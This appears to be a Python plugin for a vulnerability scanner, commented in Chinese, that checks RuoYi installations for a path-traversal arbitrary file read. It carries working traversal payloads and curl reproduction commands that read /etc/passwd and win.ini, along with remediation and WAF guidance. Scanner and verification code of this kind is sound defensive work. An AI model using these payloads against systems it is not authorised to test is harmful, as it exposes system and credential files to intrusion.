# 任意文件读取：通过 /common/download/resource 接口读取系统文件
# （Linux 读 /etc/passwd，Windows 读 win.ini —— 双载荷，见 PAYLOADS）
from common.logger import get_logger
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.matcher import is_windows_ini, match_file_read_leak
from lib.reachability import login_wall_evidence, login_wall_reason
from lib.reporter import emit
from plugins.base import PluginBase

logger = get_logger(__name__)


class FileReadPlugin(PluginBase):
    name = "任意文件读取"
    cve = "CNVD-2021-01931"
    severity = "high"
    category = "vuln"
    description = "通过 /common/download/resource 的 resource 参数目录穿越读取 /etc/passwd"
    fix = "限制 resource 参数路径，禁止 .. 目录穿越，下载接口强制鉴权"
    fix_detail = (
        "【升级方案】升级 RuoYi 至 4.7.0+（该版本已修复路径穿越）\n"
        "【代码修复】修改 CommonController.downloadResource()，对 resource 参数做路径校验：\n"
        '  String fileName = resource.substring(resource.lastIndexOf("/") + 1);\n'
        '  if (fileName.contains("..") || fileName.contains("\\")) { throw new ServiceException("非法路径"); }\n'
        "【配置加固】在 application.yml 中限制下载根目录：\n"
        "  ruoyi.profile: /data/upload （不要使用相对路径或用户可写目录）\n"
        "【权限加固】为 /common/download/resource 添加 @PreAuthorize 注解，要求登录后才可访问\n"
        '【WAF 规则】拦截 resource 参数含 ".." 或以 "/" 开头的请求\n'
        "【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制"
    )
    reproduce = (
        'curl "http://target/common/download/resource?resource=/profile/../../../../../../../etc/passwd"\n'
        "\n"
        "# Windows 系统可尝试读取 win.ini：\n"
        'curl "http://target/common/download/resource?resource=/profile/../../../../../../../windows/win.ini"\n'
        "\n"
        '# 预期响应：响应体含 "root:" 或 "[fonts]" 字样（Linux/Windows 系统文件特征）'
    )
    # D2：路径穿越在 4.7.0 已修复
    # v1.6：下界从 4.0 放宽到 3.0 —— RuoYi-Vue（3.x）与单机版（4.x）是**两条并行的版本线**，
    # 不是前后代关系。3.8.9 / 3.9.2 的同一批接口路径实测全部存在：
    #   /prod-api/common/download/resource、/monitor/job/edit、/common/upload、/system/user/list
    # 原 `>=4.0` 把这条线上最常见的分支整片跳过（盲测 v4：R6 3.9.2 与 R7 3.8.9 各有 9 个插件
    # 被 version_matrix 标为 applicable=False，含文件读取/上传/定时任务/SQL 注入）。
    # 这与本文件上方注释记录的「原范围过窄造成漏报」是同一类问题，只是当时只考虑了 4.x 内部。
    affected_versions = ">=3.0,<4.7"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A01:2021"
    # D7: WAF 绕过支持
    vuln_type = "file_read"
    supports_waf_bypass = True

    # 双载荷：Linux 读 /etc/passwd，Windows 读 win.ini。
    #
    # 为什么必须双载荷（v1.5.6 WP2）：靶场跑在 Windows 上时，读 /etc/passwd 必然
    # 拿不到证据——但这不代表目标没有文件读取漏洞。只认 Linux 特征等于在 Windows
    # 目标上系统性漏报（盲测 v3 的两个「任意文件读取」零产出就是这么来的）。
    # reproduce 里早就写了 win.ini 的 curl，但判据不支持，属文档承诺了、代码没实现。
    PAYLOADS = (
        (
            "/profile/../../../../../../../etc/passwd",
            "traversal_etc_passwd",
            "Linux（/etc/passwd）",
        ),
        (
            "/profile/../../../../../../../windows/win.ini",
            "traversal_windows_winini",
            "Windows（win.ini）",
        ),
    )

    def verify(self, target, session):
        """通过 /common/download/resource 路径穿越读取系统文件验证漏洞

        依次尝试 Linux 与 Windows 的载荷：任一读到真实文件特征即 CONFIRMED。
        Windows 目标上读不到 /etc/passwd 是**正常现象**，不能据此判 SAFE。

        @param target: 目标主机，用于拼接下载接口地址
        @param session: 复用的 HTTP 会话对象
        @return: ScanResult——响应含真实系统文件特征为 CONFIRMED，全部未命中为 SAFE
        """
        wall_reason = ""
        tried = []
        last_url = ""
        for resource, payload_class, label in self.PAYLOADS:
            url = join_url(target, f"/common/download/resource?resource={resource}")
            last_url = url
            try:
                resp = session.get(url)
            except Exception:
                # 单个载荷请求异常不立即判 UNKNOWN：另一个载荷仍可能成功
                tried.append(f"{label}: 网络异常")
                logger.debug("文件读取载荷请求失败: %s", url, exc_info=True)
                continue
            # 登录墙（302 -> /login / 200 登录页）：没读到文件内容 ≠ 不存在
            _wall = login_wall_reason(resp)
            if _wall:
                wall_reason = _wall
                tried.append(f"{label}: 登录墙")
                continue

            text = resp.text or ""
            # Linux：使用 lib.matcher.match_file_read_leak（校验 root:x:0:0: 等真实 passwd 行特征）。
            # 加固说明：原判据 match_all(text, ["root", ":/"]) 过弱——":/" 在任意含 URL 的页面都出现，
            # "root" 更是 HTML/JS/报错页的常客，普通页面即可满足，造成确定性误报。
            hit, evidence = False, ""
            if "passwd" in payload_class:
                if match_file_read_leak(text):
                    hit, evidence = True, "响应含 /etc/passwd 真实行特征（如 root:x:0:0:）"
            else:
                hit, evidence = is_windows_ini(text)

            if hit:
                emit(ok("存在任意文件读取漏洞"))
                return ScanResult(
                    kind="vuln",
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=url,
                    evidence=f"{evidence}（{label}）",
                    fix=self.fix,
                    # 结构化漏洞元数据：报告层按 vuln_type/payload_class 分类聚合统计。
                    # payload_class 按命中平台区分，避免 Linux/Windows 两次命中被去重合并。
                    extra={
                        "vuln_type": "arbitrary_file_read",
                        "payload_class": payload_class,
                        "plugin_name": "file_read",
                    },
                )
            tried.append(f"{label}: 未见文件特征")

        # 任一载荷被登录墙拦截 → 本次没测到，不能判 SAFE
        if wall_reason and len(tried) == len(self.PAYLOADS):
            emit(no("任意文件读取（登录墙拦截）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=last_url,
                evidence=login_wall_evidence(wall_reason, "文件读取是否存在"),
            )
        # 全部载荷都没拿到有效响应（网络异常）→ 同样不能判 SAFE
        if all("网络异常" in t for t in tried):
            emit(no("任意文件读取（网络异常）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=last_url,
                evidence="全部载荷请求失败：" + "；".join(tried),
            )
        emit(no("不存在任意文件读取漏洞"))
        return ScanResult(
            kind="vuln",
            name=self.name,
            status=STATUS_SAFE,
            url=last_url,
            evidence="已尝试 Linux(/etc/passwd) 与 Windows(win.ini) 载荷，响应均未含真实系统文件特征："
            + "；".join(tried),
        )
